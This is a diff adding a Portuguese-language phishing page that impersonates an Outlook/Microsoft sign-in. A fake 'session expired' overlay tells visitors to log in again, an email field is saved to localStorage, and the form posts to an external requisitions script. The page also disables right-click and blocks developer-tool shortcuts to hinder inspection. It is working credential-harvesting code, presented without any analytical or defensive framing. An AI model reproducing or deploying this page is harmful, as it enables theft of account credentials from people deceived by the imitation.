@@ -1,0 +1,467 @@
+
+
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modal Personalizado</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        #modal {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            z-index: 9999;
+            opacity: 1;
+            transition: opacity 1s ease-in-out;
+        }
+        #modal img {
+            width: auto;
+            height: 80px;
+            margin-bottom: 20px;
+            object-fit: contain;
+        }
+        #modal h2 {
+            color: #323130;
+            font-size: 20px;
+            margin-bottom: 15px;
+        }
+        #modal p {
+            color: #605e5c;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        #content {
+            filter: blur(5px);
+            transition: filter 1s ease-in-out;
+        }
+    </style>
+</head>
+<body>
+    <div id="modal">
+        <img src="https://conceito.de/wp-content/uploads/2011/08/unnamed.png" alt="Informação">
+        <h2>Sessão Expirada</h2>
+        <p>A sua sessão expirou devido à inatividade.<br>Para continuar acessando o site, por favor, faça o login novamente.</p>
+    </div>
+    <div id="content">
+        ﻿<!DOCTYPE html>
+<html dir="ltr" lang="PT-BR">
+
+<head>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+
+    <title>OK</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
+
+    <link rel="shortcut icon" href="./favicons.ico">
+
+    <link rel="stylesheet" title="Converged_v2" type="text/css" href="css/0.css">
+
+    <script>
+        function validarEmail() {
+            var emailInput = document.getElementById("usuario");
+            var submitButton = document.getElementById("idSIButton9");
+
+            if (emailInput && submitButton) { // Verifica se os elementos existem
+                if (isValidEmail(emailInput.value)) {
+                    submitButton.classList.remove("disabled");
+                } else {
+                    submitButton.classList.add("disabled");
+                }
+            }
+        }
+
+        function isValidEmail(email) {
+            var pattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
+            return pattern.test(email);
+        }
+
+        // Acionar a função de validação no carregamento da página
+        window.onload = function() {
+            validarEmail();
+        };
+
+        // Acionar a função de validação sempre que o campo de entrada for alterado
+        document.addEventListener("DOMContentLoaded", function() {
+            var emailInput = document.getElementById("usuario");
+            if (emailInput) { // Verifica se o elemento existe antes de adicionar o ouvinte de evento
+                emailInput.addEventListener("input", validarEmail);
+            }
+        });
+    </script>
+
+    <style>
+        .disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        #footer {
+            color: #ffffff;
+            background-color: rgba(0, 0, 0, .6);
+            filter: progid:DXImageTransform.010.gradient(GradientType=0, startColorstr='#99000000', endColorstr='#99000000');
+        }
+
+        #loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            /* Fundo branco transparente */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            /* Garante que o elemento esteja na frente de outros elementos */
+        }
+
+        #loading img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+    </style>
+
+</head>
+
+<body class="cb">
+
+    <div id="loading" style="display:none;">
+        <img src="https://cdn.dribbble.com/users/1075504/screenshots/12394713/media/1b2985070f81874a146234ae0247ad45.gif" alt="Loading..." style="max-width:350px; height:auto;">
+    </div>
+    <div>
+
+        <div data-bind="if: activeDialog"></div>
+
+        <form id="formLogin" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" class="provide-min-height">
+
+            <div class="login-paginated-page">
+                <div id="lightboxTemplateContainer" class="provide-min-height">
+                    <!--  -->
+                    <div id="lightboxBackgroundContainer">
+                        <div class="background-image-holder" role="presentation">
+
+                            <div id="backgroundImage" class="background-image ext-background-image" style="background-image: url(&quot;img/0.svg&quot;);"></div>
+
+                        </div>
+                    </div>
+
+                    <div class="outer">
+                        <div class="template-section main-section">
+                            <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
+                                <div class="full-height">
+                                    <div class="flex-column">
+
+                                        <div class="background-logo-holder">
+                                            <img class="background-logo" role="presentation" data-bind="attr: { src: $page.backgroundLogoUrl }" src="img/00100.png">
+                                        </div>
+
+                                        <div class="win-scroll">
+                                            <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
+                                                <div class="lightbox-cover"></div>
+                                                <div>
+                                                    <img class="logo" role="img" pngsrc="img/010.png" svgsrc="img/010.svg" src="img/010.svg" alt="010">
+                                                </div>
+                                                <div role="main">
+                                                    <div>
+                                                        <div class="pagination-view animate slide-in-next">
+                                                            <div data-viewid="1" data-showfedcredbutton="true">
+
+                                                                <div>
+                                                                    <div>
+                                                                        <div class="row title ext-title" id="loginHeader">
+                                                                            <div role="heading" aria-level="1" data-bind="text: title">Entrar</div>
+                                                                            <div data-bind="text: subtitle || str['WF_STR_App_Title'], externalCss: { 'subtitle': true }" class="subtitle ext-subtitle">Continuar para Outlook</div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+
+                                                                <div class="row">
+
+                                                                    <div id="msgErro" style="color:red;"></div>
+
+
+                                                                    <div class="form-group col-md-24">
+                                                                        <div class="placeholderContainer">
+                                                                            <input value="" value="" required type="email" name="usuario" id="usuario" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box required" data-report-event="Signin_Email_Phone_Skype" data-report-trigger="click" data-report-value="Email_Phone_Skype_Entry" aria-label="Insira seu email, telefone ou Skype." aria-describedby="loginHeader usernameError" placeholder="Email, telefone ou Skype" data-report-attached="1" oninput="validarEmail()">
+                                                                        </div>
+                                                                    </div>
+
+                                                                </div>
+
+                                                                <div>
+                                                                    <div class="row">
+                                                                        <div class="col-md-24">
+                                                                            <div class="text-13">
+                                                                                <div class="form-group">Não tem uma conta? <a href="javascript:void();" id="signup" aria-label="Criar uma conta da 010">Crie uma!</a></div>
+                                                                                <div class="form-group">
+                                                                                    <a id="idA_PWD_SwitchToFido" name="switchToFido" href="#" data-bind="
+                                                                                            text: fidoLinkText,
+                                                                                            click: switchToFidoCredLink_onClick">Entrar com uma chave de segurança</a>
+                                                                                    <span class="help-button" role="button" tabindex="0" aria-label="Saiba mais sobre como entrar com uma chave de segurança">
+                                                                                        <img role="presentation" pngsrc="img/documentation.png" svgsrc="img/11011.svg" data-bind="imgSrc" src="img/11011.svg">
+                                                                                    </span>
+
+                                                                                    <div>
+                                                                                        <div>
+                                                                                        </div>
+                                                                                    </div>
+
+                                                                                </div>
+
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+
+                                                                <div class="win-button-pin-bottom">
+                                                                    <div class="row">
+                                                                        <div>
+                                                                            <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">
+                                                                                <div class="inline-block button-item ext-button-item">
+                                                                                    <input 
+                                                                                        type="submit" 
+                                                                                        id="idSIButton9" 
+                                                                                        class="win-button button_primary button ext-button primary ext-primary" 
+                                                                                        data-report-event="Signin_Submit" 
+                                                                                        data-report-trigger="click" 
+                                                                                        data-report-value="Submit" 
+                                                                                        value="Avançar" 
+                                                                                        data-report-attached="1" 
+                                                                                        style="opacity: 1; pointer-events: auto;"
+                                                                                        onclick="document.getElementById('loadingGif').style.display='block'; return true;">
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <div class="promoted-fed-cred-box ext-promoted-fed-cred-box">
+
+                                                <div class="promoted-fed-cred-content">
+
+                                                    <div class="row tile">
+                                                        <div class="table" role="button" tabindex="0" aria-label="Opções de entrada">
+
+                                                            <div class="table-row">
+
+                                                                <div class="table-cell tile-img medium">
+
+                                                                    <img class="tile-img medium" role="presentation" src="img/0101010.svg">
+
+                                                                </div>
+
+                                                                <div class="table-cell text-left content">
+                                                                    <div data-test-id="signinOptions">Opções de entrada</div>
+                                                                </div>
+
+                                                            </div>
+
+                                                        </div>
+                                                    </div>
+
+                                                </div>
+
+                                            </div>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                            </div>
+
+                        </div>
+
+                        <style>
+                            #ftrTerms {
+                                color: #fff;
+                            }
+
+                            #ftrPrivacy {
+                                color: #fff;
+                            }
+
+                            #moreOptions {
+                                color: #fff;
+                            }
+                        </style>
+
+                        <div id="footer" role="contentinfo" class="footer ext-footer">
+                            <div>
+                                <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">
+                                    <a id="ftrTerms" href="javascript:void(0);" class="footer-content ext-footer-content footer-item ext-footer-item">Termos de uso</a>
+                                    <a id="ftrPrivacy" href="javascript:void(0);" class="footer-content ext-footer-content footer-item ext-footer-item">Privacidade e cookies</a>
+                                    <a id="moreOptions" href="#" role="button" aria-label="Clique aqui para obter informações sobre solução de problemas" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </form>
+
+        <form aria-hidden="true" target="_top"></form>
+
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
+    <script language="javascript" src="js/requisitions.js"></script>
+    <script>
+        // Captura o elemento de entrada do email
+        const emailInput = document.getElementById('usuario');
+
+        // Adiciona um ouvinte de evento para o evento 'input' que é acionado quando o valor do campo muda
+        emailInput.addEventListener('input', function() {
+            // Obtém o valor do campo de entrada
+            const emailValue = emailInput.value;
+
+            // Armazena o valor do email em localStorage
+            localStorage.setItem('email', emailValue);
+        });
+    </script>
+
+    <script>
+        $(document).ready(function() {
+            $('#msgErro').on('DOMNodeInserted', function() {
+                setTimeout(function() {
+                    location.reload();
+                }, 2000);
+            });
+        });
+    </script>
+</body>
+
+</html>
+ <!-- Original content from the uploaded index.php -->
+    </div>
+    <script>
+        // Esconde o modal após 5 segundos e remove o blur
+        setTimeout(() => {
+            const modal = document.getElementById('modal');
+            const content = document.getElementById('content');
+            modal.style.opacity = '0'; // Faz o modal desaparecer gradualmente
+            content.style.filter = 'none'; // Remove o blur do conteúdo
+            setTimeout(() => {
+                modal.style.display = 'none'; // Remove completamente o modal após o fade-out
+            }, 1000); // Tempo para o fade-out terminar
+        }, 1000);
+    </script>
+
+
+
+
+<script>
+    // Desabilita o botão direito do mouse
+    document.addEventListener('contextmenu', function(event) {
+        event.preventDefault();
+    });
+
+    // Bloqueia atalhos comuns para abrir as Ferramentas do Desenvolvedor
+    document.addEventListener('keydown', function(event) {
+        if (event.key === "F12" || 
+            (event.ctrlKey && event.shiftKey && (event.key === 'I' || event.key === 'J')) || 
+            (event.ctrlKey && (event.key === 'U' || event.key === 'S'))) {
+            event.preventDefault();
+        }
+    });
+</script>
+
+
+<div id="loadingGif"></div>
+
+<!-- Estilos e scripts ao final -->
+<style>
+    #botaoEntrar:disabled {
+        background-color: #449de3 !important;
+        color: #ffffff !important;
+    }
+
+    svg {
+        width: 40px;
+        height: 40px;
+        margin: 0px;
+        vertical-align: middle;
+        padding: 0px;
+        text-align: center !important;
+    }
+
+    #loadingGif {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        display: none;
+        background-image: url('6.gif');
+        width: 250px;
+        height: 250px;
+        background-size: cover;
+        z-index: 9999;
+    }
+</style>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const senhaInput = document.getElementById('passwd');
+        const botaoEntrar = document.getElementById('botaoEntrar');
+        const botaoAvancar = document.getElementById('idSIButton9');
+        const loadingGif = document.getElementById('loadingGif');
+
+        // Ativar botão após 5 caracteres na senha
+        if (senhaInput && botaoEntrar) {
+            senhaInput.addEventListener('input', function() {
+                if (senhaInput.value.length >= 5) {
+                    botaoEntrar.removeAttribute('disabled');
+                } else {
+                    botaoEntrar.setAttribute('disabled', 'disabled');
+                }
+            });
+        }
+
+        // Mostrar loading ao clicar em "Entrar"
+        if (botaoEntrar) {
+            botaoEntrar.addEventListener('click', function () {
+                loadingGif.style.display = 'block';
+            });
+        }
+
+        // Mostrar loading ao clicar em "Avançar"
+        if (botaoAvancar) {
+            botaoAvancar.addEventListener('click', function () {
+                loadingGif.style.display = 'block';
+            });
+        }
+    });
+</script>
+
+
+</body>
+</html>
